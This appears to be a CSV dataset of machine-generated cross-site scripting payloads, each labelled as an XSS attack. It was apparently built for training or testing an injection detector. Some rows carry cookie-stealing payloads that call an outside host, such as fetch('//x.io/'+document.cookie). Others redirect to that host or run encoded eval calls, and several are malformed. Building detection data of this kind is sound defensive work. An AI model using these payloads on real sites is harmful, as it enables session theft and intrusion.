text,label,attack_type,generator
'><SvG OnClIcK=FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)>,1,xss,codellama
"<IfRaMe oNmOuSeOvEr=""EvAl(aToB('yWxLcNqOmSk'))"">",1,xss,codellama
"""&gt;&lt;marquee ontoggle=fetch('//x.io/'+document.cookie)&gt;",1,xss,codellama
%253Caudio%2520onerror%253D%2522alert%2528document.domain%2529%2522%253E,1,xss,codellama
"""&gt;&lt;object onload=eval(atob('YWxlcnQoMSk'))&gt;",1,xss,codellama
%2527%253E%253Caudio%2520onload%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
%253Ca%2520onstart%253D%2522alert%2528document.cookie%2529%2522%253E,1,xss,codellama
%253Cobject%2520onstart%253Dalert%25281%2529%253E,1,xss,codellama
<SvG OnFoCuS=PrInT()>,1,xss,codellama
'><BoDy oNeRrOr=cOnFiRm(1)>,1,xss,codellama
%2522%253E%253Cdiv%2520onfocus%253Dalert%2528document.domain%2529%253E,1,xss,codellama
%2527%253E%253Cscript%2520onclick%253Dalert%2528document.domain%2529%253E,1,xss,codellama
%253Cdetails%2520onfocus%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
%253Cscript%2520onstart%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,codellama
%253Cimg%2520onfocus%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
'&gt;&lt;ScRiPt oNpOiNtErOvEr=lOcAtIoN='//x.iO'&gt;,1,xss,codellama
%2522%253E%253Cscript%2520ontoggle%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
%2522%253E%253Cmarquee%2520onerror%253Dconfirm%25281%2529%253E,1,xss,codellama
<SvG OnErRoR=CoNfIrM(1)>,1,xss,codellama
'><ImG OnAnImAtIoNsTaRt=cOnFiRm(1)>,1,xss,codellama
"""><InPuT OnClIcK=CoNfIrM(1)>",1,xss,codellama
<BoDy oNcLiCk=lOcAtIoN='//x.iO'>,1,xss,codellama
%2527%253E%253Csvg%2520onclick%253Dalert%2528document.domain%2529%253E,1,xss,codellama
%253Ciframe%2520onpointerover%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
%253Csvg%2520onclick%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
%253Cobject%2520oninput%253D%2522print%2528%2529%2522%253E,1,xss,codellama
"<ViDeO OnFoCuS=""aLeRt(dOcUmEnT.DoMaIn)"">",1,xss,codellama
"<BoDy oNfOcUs=""AlErT(DoCuMeNt.cOoKiE)"">",1,xss,codellama
"<InPuT OnStArT=""eVaL(AtOb('YwXlCnQoMsK'))"">",1,xss,codellama
%2522%253E%253Cmarquee%2520onstart%253Dprint%2528%2529%253E,1,xss,codellama
'&gt;&lt;img onerror=location='//x.io'&gt;,1,xss,codellama
&lt;div onclick=eval(atob('YWxlcnQoMSk'))&gt;,1,xss,codellama
"""><ScRiPt oNiNpUt=aLeRt(dOcUmEnT.DoMaIn)>",1,xss,codellama
'><AuDiO OnFoCuS=AlErT(DoCuMeNt.dOmAiN)>,1,xss,codellama
%2527%253E%253Caudio%2520onfocus%253Dalert%25281%2529%253E,1,xss,codellama
%253Cbody%2520onerror%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,codellama
%253Cmarquee%2520ontoggle%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,codellama
%2522%253E%253Cdiv%2520onpointerover%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
%253cImG%2520OnMoUsEoVeR%253d%2522aLeRt%2528dOcUmEnT.CoOkIe%2529%2522%253E,1,xss,codellama
"""&gt;&lt;BoDy oNfOcUs=fEtCh('//X.Io/'+dOcUmEnT.CoOkIe)&gt;",1,xss,codellama
%2522%253E%253Cmarquee%2520onload%253Dprint%2528%2529%253E,1,xss,codellama
"<ScRiPt oNpOiNtErOvEr=""EvAl(aToB('yWxLcNqOmSk'))"">",1,xss,codellama
%2527%253E%253Cimg%2520onanimationstart%253Dalert%2528document.domain%2529%253E,1,xss,codellama
"<ScRiPt oNpOiNtErOvEr=""AlErT(DoCuMeNt.cOoKiE)"">",1,xss,codellama
%253Ca%2520oninput%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
"<IfRaMe sRc=""JaVaScRiPt:pRiNt()"">",1,xss,codellama
'><MaRqUeE OnToGgLe=aLeRt(dOcUmEnT.CoOkIe)>,1,xss,codellama
%2522%253E%253Cimg%2520onstart%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
%2527%253E%253Cmarquee%2520oninput%253Dprint%2528%2529%253E,1,xss,codellama
"<AuDiO OnInPuT=""cOnFiRm(1)"">",1,xss,codellama
'><A OnPoInTeRoVeR=AlErT(DoCuMeNt.cOoKiE)>,1,xss,codellama
%2527%253E%253Cinput%2520onpointerover%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
%2527%253E%253Cvideo%2520ontoggle%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
%2527%253E%253Cbody%2520ontoggle%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
<A OnPoInTeRoVeR=AlErT(1)>,1,xss,codellama
%253Cdiv%2520oninput%253D%2522print%2528%2529%2522%253E,1,xss,codellama
%253Ca%2520onclick%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
%253Ca%2520onclick%253Dconfirm%25281%2529%253E,1,xss,codellama
%2522%253E%253Cbody%2520onmouseover%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
"<ScRiPt oNsTaRt=""LoCaTiOn='//X.Io'"">",1,xss,codellama
"&lt;ScRiPt ontoggle=""location='//x.io'""&gt;",1,xss,codellama
"""&gt;&lt;a oninput=alert(document.domain)&gt;",1,xss,codellama
%2522%253E%253Cinput%2520onstart%253Dprint%2528%2529%253E,1,xss,codellama
"&lt;object onmouseover=""location='//x.io'""&gt;",1,xss,codellama
%2522%253E%253Caudio%2520onload%253Dalert%2528document.domain%2529%253E,1,xss,codellama
%253Caudio%2520onpointerover%253D%2522confirm%25281%2529%2522%253E,1,xss,codellama
'><DiV OnErRoR=EvAl(aToB('yWxLcNqOmSk'))>,1,xss,codellama
"<MaRqUeE OnAnImAtIoNsTaRt=""LoCaTiOn='//X.Io'"">",1,xss,codellama
%253cA%2520OnClIcK%253d%2522cOnFiRm%25281%2529%2522%253E,1,xss,codellama
"""&gt;&lt;script onclick=alert(document.cookie)&gt;",1,xss,codellama
<ScRiPt oNeRrOr=aLeRt(dOcUmEnT.CoOkIe)>,1,xss,codellama
%253Cscript%2520oninput%253Dalert%2528document.domain%2529%253E,1,xss,codellama
%253Cimg%2520onstart%253Dalert%25281%2529%253E,1,xss,codellama
%253Cmarquee%2520onload%253D%2522confirm%25281%2529%2522%253E,1,xss,codellama
'><ScRiPt oNmOuSeOvEr=fEtCh('//X.Io/'+dOcUmEnT.CoOkIe)>,1,xss,codellama
%2527%253E%253Cinput%2520onmouseover%253Dalert%2528document.domain%2529%253E,1,xss,codellama
%2527%253E%253Cimg%2520onfocus%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
%253Cdetails%2520onpointerover%253Dprint%2528%2529%253E,1,xss,codellama
<MaRqUeE OnErRoR=CoNfIrM(1)>,1,xss,codellama
%2522%253E%253Cobject%2520onstart%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
%2527%253E%253CObJeCt%2520oNtOgGlE%253DFeTcH%2528%2527%252F%252Fx.iO%252F%2527%252BDoCuMeNt.cOoKiE%2529%253E,1,xss,codellama
<DeTaIlS OnFoCuS=PrInT()>,1,xss,codellama
%253Cdiv%2520onstart%253Dprint%2528%2529%253E,1,xss,codellama
%253Cmarquee%2520onstart%253Dalert%25281%2529%253E,1,xss,codellama
%2526lt%253Biframe%2520ontoggle%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%2526gt%253B,1,xss,codellama
%253cInPuT%2520OnPoInTeRoVeR%253dAlErT%25281%2529%253E,1,xss,codellama
<DeTaIlS OnInPuT=PrInT()>,1,xss,codellama
%2522%253E%253Cobject%2520onmouseover%253Dprint%2528%2529%253E,1,xss,codellama
<DeTaIlS OnToGgLe=aLeRt(dOcUmEnT.DoMaIn)>,1,xss,codellama
"&lt;body onerror=""eval(atob('YWxlcnQoMSk'))""&gt;",1,xss,codellama
%2527%253E%253Cinput%2520onpointerover%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
%253Caudio%2520onload%253Dalert%25281%2529%253E,1,xss,codellama
%2522%253E%253Cdiv%2520onfocus%253Dconfirm%25281%2529%253E,1,xss,codellama
%253Cinput%2520oninput%253D%2522alert%2528document.domain%2529%2522%253E,1,xss,codellama
%2522%253E%253Cimg%2520onfocus%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
%253Cinput%2520oninput%253Dconfirm%25281%2529%253E,1,xss,codellama
%253Cbody%2520onfocus%253Dalert%25281%2529%253E,1,xss,codellama
"&Lt;iMg oNpOiNtErOvEr=""AlErT(DoCuMeNt.cOoKiE)""&Gt;",1,xss,codellama
%253Cscript%2520onload%253Dalert%2528document.domain%2529%253E,1,xss,codellama
%253Cmarquee%2520ontoggle%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,codellama
%2527%253E%253Ciframe%2520onfocus%253Dprint%2528%2529%253E,1,xss,codellama
<ObJeCt oNiNpUt=fEtCh('//X.Io/'+dOcUmEnT.CoOkIe)>,1,xss,codellama
%253Cdetails%2520oninput%253Dalert%2528document.domain%2529%253E,1,xss,codellama
%2527%253E%253Cinput%2520onanimationstart%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
<InPuT OnInPuT=PrInT()>,1,xss,codellama
"<DeTaIlS OnMoUsEoVeR=""cOnFiRm(1)"">",1,xss,codellama
'><scr ipt ontoggle=confirm(1)>,1,xss,codellama
<ScRiPt oNsTaRt=eVaL(AtOb('YwXlCnQoMsK'))>,1,xss,codellama
%2522%253E%253Cimg%2520onpointerover%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
"&lt;details onload=""alert(document.domain)""&gt;",1,xss,codellama
%253Cinput%2520onpointerover%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
%253Cdetails%2520oninput%253Dconfirm%25281%2529%253E,1,xss,codellama
%253Cmarquee%2520onstart%253D%2522confirm%25281%2529%2522%253E,1,xss,codellama
%2527%253E%253Cvideo%2520ontoggle%253Dalert%2528document.domain%2529%253E,1,xss,codellama
'><ViDeO OnErRoR=CoNfIrM(1)>,1,xss,codellama
%253Cobject%2520onclick%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%253E,1,xss,codellama
%253Cimg%2520onclick%253D%2522print%2528%2529%2522%253E,1,xss,codellama
"&lt;audio oninput=""print()""&gt;",1,xss,codellama
%253CImG%2520OnToGgLe%253D%2522AlErT%25281%2529%2522%253E,1,xss,codellama
%253Cmarquee%2520onerror%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,codellama
%2522%253E%253Ca%2520ontoggle%253Dprint%2528%2529%253E,1,xss,codellama
%253Csvg%2520ontoggle%253Dprint%2528%2529%253E,1,xss,codellama
%253Cmarquee%2520onclick%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,codellama
%253cBoDy%2520oNtOgGlE%253d%2522fEtCh%2528%2527%252F%252fX.Io%252F%2527%252BdOcUmEnT.CoOkIe%2529%2522%253E,1,xss,codellama
"<ObJeCt oNlOaD=""aLeRt(dOcUmEnT.CoOkIe)"">",1,xss,codellama
%2527%253E%253Cimg%2520onstart%253Dalert%2528document.domain%2529%253E,1,xss,codellama
%253Cdiv%2520oninput%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%253E,1,xss,codellama
%2527%253E%253Ciframe%2520onstart%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
'&gt;&lt;marquee onmouseover=confirm(1)&gt;,1,xss,codellama
%253Cscript%2520oninput%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
%2522%253E%253Cmarquee%2520onstart%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
%2522%253E%253Cmarquee%2520onclick%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
<ScRiPt oNtOgGlE=EvAl(aToB('yWxLcNqOmSk'))>,1,xss,codellama
%2527%253E%253Csvg%2520onpointerover%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
%253Cobject%2520onpointerover%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
'&gt;&lt;iframe oninput=location='//x.io'&gt;,1,xss,codellama
%2527%253E%253Cvideo%2520onstart%253Dconfirm%25281%2529%253E,1,xss,codellama
%2527%253E%253Ca%2520onclick%253Dconfirm%25281%2529%253E,1,xss,codellama
%2527%253E%253Caudio%2520onmouseover%253Dalert%2528document.domain%2529%253E,1,xss,codellama
"&lt;details ontoggle=""alert(1)""&gt;",1,xss,codellama
"<AuDiO OnStArT=""aLeRt(dOcUmEnT.DoMaIn)"">",1,xss,codellama
"<ScRiPt onfocus=""location='//x.io'"">",1,xss,codellama
%253Cmarquee%2520onmouseover%253Dalert%2528document.domain%2529%253E,1,xss,codellama
%253Cvideo%2520ontoggle%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,codellama
%2527%253E%253Cdetails%2520onmouseover%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
"<ViDeO OnPoInTeRoVeR=""aLeRt(dOcUmEnT.DoMaIn)"">",1,xss,codellama
%253Cinput%2520onclick%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
%2522%253E%253Cdiv%2520onanimationstart%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
%253Cimg%2520oninput%253Dconfirm%25281%2529%253E,1,xss,codellama
%2522%253E%253Cinput%2520onfocus%253Dalert%2528document.domain%2529%253E,1,xss,codellama
"""><MaRqUeE OnFoCuS=AlErT(DoCuMeNt.dOmAiN)>",1,xss,codellama
<ObJeCt oNpOiNtErOvEr=lOcAtIoN='//x.iO'>,1,xss,codellama
%2522%253E%253cAuDiO%2520OnStArT%253dAlErT%2528DoCuMeNt.cOoKiE%2529%253E,1,xss,codellama
%253Ciframe%2520onfocus%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,codellama
%2522%253E%253Cvideo%2520onerror%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
"""><ViDeO OnToGgLe=aLeRt(dOcUmEnT.DoMaIn)>",1,xss,codellama
%2522%253E%253Ciframe%2520onload%253Dprint%2528%2529%253E,1,xss,codellama
%253Ca%2520onerror%253D%2522alert%2528document.domain%2529%2522%253E,1,xss,codellama
%2527%253E%253Ciframe%2520onmouseover%253Dalert%25281%2529%253E,1,xss,codellama
<A OnClIcK=AlErT(1)>,1,xss,codellama
%2527%253E%253Cinput%2520onerror%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
%253Cimg%2520onpointerover%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,codellama
%253Ciframe%2520src%253D%2522java%2509script%253Afetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,codellama
%2522%253E%253Cvideo%2520onmouseover%253Dprint%2528%2529%253E,1,xss,codellama
%253Caudio%2520ontoggle%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
'><AuDiO OnToGgLe=aLeRt(dOcUmEnT.DoMaIn)>,1,xss,codellama
"""><SvG OnAnImAtIoNsTaRt=cOnFiRm(1)>",1,xss,codellama
"""&gT;&lT;ScRiPt oNmOuSeOvEr=pRiNt()&gT;",1,xss,codellama
%2522%253E%253Cobject%2520ontoggle%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
%2527%253E%253Cdetails%2520oninput%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
"<BoDy oNsTaRt=""FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)"">",1,xss,codellama
%253Cvideo%2520onpointerover%253Dalert%25281%2529%253E,1,xss,codellama
%2527%2526gt%253B%2526lt%253Bsvg%2520onclick%253Dlocation%253D%2527%252F%252Fx.io%2527%2526gt%253B,1,xss,codellama
"""><DiV OnMoUsEoVeR=PrInT()>",1,xss,codellama
<ObJeCt oNiNpUt=pRiNt()>,1,xss,codellama
"""><DiV OnToGgLe=cOnFiRm(1)>",1,xss,codellama
%2527%253E%253Cdetails%2520oninput%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
"""><IfRaMe oNeRrOr=pRiNt()>",1,xss,codellama
%2522%253E%253Csvg%2520onload%253Dalert%25281%2529%253E,1,xss,codellama
"""><ImG OnPoInTeRoVeR=AlErT(1)>",1,xss,codellama
%2522%253E%253Cobject%2520ontoggle%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
%253Ciframe%2520onclick%253Dconfirm%25281%2529%253E,1,xss,codellama
%253Cvideo%2520onmouseover%253D%2522alert%2528document.domain%2529%2522%253E,1,xss,codellama
"&lt;a onpointerover=""fetch('//x.io/'+document.cookie)""&gt;",1,xss,codellama
%253Cdetails%2520onclick%253Dconfirm%25281%2529%253E,1,xss,codellama
"<iframe src=""javascr ipt:alert(document.domain)"">",1,xss,codellama
"""><MaRqUeE OnFoCuS=EvAl(aToB('yWxLcNqOmSk'))>",1,xss,codellama
%2522%253E%253Cimg%2520onload%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
%2527%253E%253Csvg%2520onfocus%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
%2527%253E%253Cobject%2520onclick%253Dconfirm%25281%2529%253E,1,xss,codellama
%2527%253E%253Cdetails%2520onerror%253Dalert%2528document.domain%2529%253E,1,xss,codellama
"""><A OnToGgLe=lOcAtIoN='//x.iO'>",1,xss,codellama
"<DiV OnStArT=""fEtCh('//X.Io/'+dOcUmEnT.CoOkIe)"">",1,xss,codellama
%2522%253E%253Ciframe%2520onpointerover%253Dalert%25281%2529%253E,1,xss,codellama
"""><sCrIpT onmouseover=alert(1)>",1,xss,codellama
<ScRiPt>confirm(1)</ScRiPt>,1,xss,codellama
%253Cdetails%2520onclick%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
<ObJeCt oNiNpUt=eVaL(AtOb('YwXlCnQoMsK'))>,1,xss,codellama
%2522%253E%253Cimg%2520onanimationstart%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
%2527%253E%253Cmarquee%2520onerror%253Dalert%25281%2529%253E,1,xss,codellama
%253cSvG%2520OnStArT%253dPrInT%2528%2529%253e,1,xss,codellama
"""><AuDiO OnPoInTeRoVeR=CoNfIrM(1)>",1,xss,codellama
"""&gt;&lt;video onstart=alert(document.cookie)&gt;",1,xss,codellama
<A OnErRoR=AlErT(1)>,1,xss,codellama
%253Ciframe%2520onfocus%253D%2522alert%2528document.cookie%2529%2522%253E,1,xss,codellama
%2527%253E%253Cdetails%2520onerror%253Dconfirm%25281%2529%253E,1,xss,codellama
"<SvG OnInPuT=""eVaL(AtOb('YwXlCnQoMsK'))"">",1,xss,codellama
<ImG OnLoAd=eVaL(AtOb('YwXlCnQoMsK'))>,1,xss,codellama
<AuDiO OnMoUsEoVeR=AlErT(1)>,1,xss,codellama
%2522%253E%253Ciframe%2520onstart%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
<InPuT OnStArT=FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)>,1,xss,codellama
%2527%2526gt%253B%2526lt%253Ba%2520onerror%253Dalert%25281%2529%2526gt%253B,1,xss,codellama
'><InPuT OnFoCuS=CoNfIrM(1)>,1,xss,codellama
%2522%253E%253cInPuT%2520OnToGgLe%253DfEtCh%2528%2527%252F%252fX.Io%252F%2527%252BdOcUmEnT.CoOkIe%2529%253e,1,xss,codellama
%253Ciframe%2520ontoggle%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
%2527%253E%253Cimg%2520onload%253Dconfirm%25281%2529%253E,1,xss,codellama
'&gt;&lt;input onstart=alert(1)&gt;,1,xss,codellama
"<ViDeO OnFoCuS=""fEtCh('//X.Io/'+dOcUmEnT.CoOkIe)"">",1,xss,codellama
%253Csvg%2520ontoggle%253D%2522alert%2528document.domain%2529%2522%253E,1,xss,codellama
%253Caudio%2520onload%253Dconfirm%25281%2529%253E,1,xss,codellama
"""><ViDeO OnPoInTeRoVeR=LoCaTiOn='//X.Io'>",1,xss,codellama
%253Cobject%2520onclick%253D%2522alert%2528document.domain%2529%2522%253E,1,xss,codellama
"""><MaRqUeE OnAnImAtIoNsTaRt=cOnFiRm(1)>",1,xss,codellama
%2522%253E%253Ca%2520onpointerover%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
%2527%253E%253Cmarquee%2520onerror%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
"&lt;BoDy oNcLiCk=""CoNfIrM(1)""&gt;",1,xss,codellama
%2522%253E%253cViDeO%2520OnLoAd%253DaLeRt%2528dOcUmEnT.DoMaIn%2529%253e,1,xss,codellama
"""&gt;&lt;input oninput=alert(document.cookie)&gt;",1,xss,codellama
%253Cinput%2520onanimationstart%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
%2527%253E%253Cmarquee%2520onstart%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
&lt;div ontoggle=alert(document.cookie)&gt;,1,xss,codellama
%2522%253E%253Cbody%2520onfocus%253Dalert%2528document.domain%2529%253E,1,xss,codellama
%2527%253E%253Cimg%2520onmouseover%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
'><AuDiO OnInPuT=PrInT()>,1,xss,codellama
%253Cobject%2520onload%253Dalert%2528document.domain%2529%253E,1,xss,codellama
"<A OnPoInTeRoVeR=""cOnFiRm(1)"">",1,xss,codellama
%2522%253E%253CImG%2520OnLoAd%253DpRiNt%2528%2529%253E,1,xss,codellama
'&gt;&lt;audio onanimationstart=print()&gt;,1,xss,codellama
'&gt;&lt;a onfocus=confirm(1)&gt;,1,xss,codellama
'><AuDiO OnLoAd=lOcAtIoN='//x.iO'>,1,xss,codellama
<SvG OnErRoR=FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)>,1,xss,codellama
%253cScRiPt%2520oNeRrOr%253D%2522EvAl%2528aToB%2528%2527yWxLcNqOmSk%2527%2529%2529%2522%253E,1,xss,codellama
%2522%253E%253Ca%2520onpointerover%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
"""><BoDy oNtOgGlE=LoCaTiOn='//X.Io'>",1,xss,codellama
%253Caudio%2520oninput%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
<MaRqUeE OnToGgLe=aLeRt(1)>,1,xss,codellama
%253Cobject%2520oninput%253Dconfirm%25281%2529%253E,1,xss,codellama
%2527%253E%253Csvg%2520onfocus%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
"""&gT;&lT;A OnFoCuS=EvAl(aToB('yWxLcNqOmSk'))&Gt;",1,xss,codellama
<ScRiPt oNaNiMaTiOnStArT=PrInT()>,1,xss,codellama
%2527%253E%253Cdetails%2520oninput%253Dalert%25281%2529%253E,1,xss,codellama
%253Cdetails%2520onfocus%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%253E,1,xss,codellama
%2522%253E%253Ca%2520ontoggle%253Dconfirm%25281%2529%253E,1,xss,codellama
'><DeTaIlS OnStArT=CoNfIrM(1)>,1,xss,codellama
"<A OnPoInTeRoVeR=""pRiNt()"">",1,xss,codellama
%2527%253E%253CIfRaMe%2520oNiNpUt%253DeVaL%2528AtOb%2528%2527YwXlCnQoMsK%2527%2529%2529%253E,1,xss,codellama
"""><ObJeCt oNlOaD=FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)>",1,xss,codellama
'><InPuT OnMoUsEoVeR=FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)>,1,xss,codellama
%253Csvg%2520onfocus%253Dalert%25281%2529%253E,1,xss,codellama
"&lt;object onload=""confirm(1)""&gt;",1,xss,codellama
%253Cobject%2520onload%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
%253Ca%2520onload%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
%2522%253E%253Cinput%2520onanimationstart%253Dalert%2528document.domain%2529%253E,1,xss,codellama
%253Cvideo%2520ontoggle%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
"""><A OnFoCuS=LoCaTiOn='//X.Io'>",1,xss,codellama
'><ScRiPt oNtOgGlE=LoCaTiOn='//X.Io'>,1,xss,codellama
%253Cinput%2520oninput%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%253E,1,xss,codellama
%2527%253E%253Cdiv%2520onclick%253Dconfirm%25281%2529%253E,1,xss,codellama
'><MaRqUeE OnToGgLe=cOnFiRm(1)>,1,xss,codellama
"&lt;body onanimationstart=""print()""&gt;",1,xss,codellama
%253Cimg%2520onstart%253D%2522alert%2528document.cookie%2529%2522%253E,1,xss,codellama
%2522%253E%253Cscr ipt%2520onstart%253Dalert%2528document.domain%2529%253E,1,xss,codellama
%253Cvideo%2520onanimationstart%253Dalert%25281%2529%253E,1,xss,codellama
%2522%253E%253Cdiv%2520onerror%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
%2522%253E%253Cimg%2520oninput%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
%253Ciframe%2520oninput%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
%2522%2526gt%253B%2526lt%253Bsvg%2520ontoggle%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2526gt%253B,1,xss,codellama
"<DeTaIlS OnStArT=""lOcAtIoN='//x.iO'"">",1,xss,codellama
%253Cmarquee%2520ontoggle%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
"<BoDy oNaNiMaTiOnStArT=""fEtCh('//X.Io/'+dOcUmEnT.CoOkIe)"">",1,xss,codellama
%2527%253E%253Cdetails%2520onclick%253Dalert%25281%2529%253E,1,xss,codellama
<ViDeO OnLoAd=lOcAtIoN='//x.iO'>,1,xss,codellama
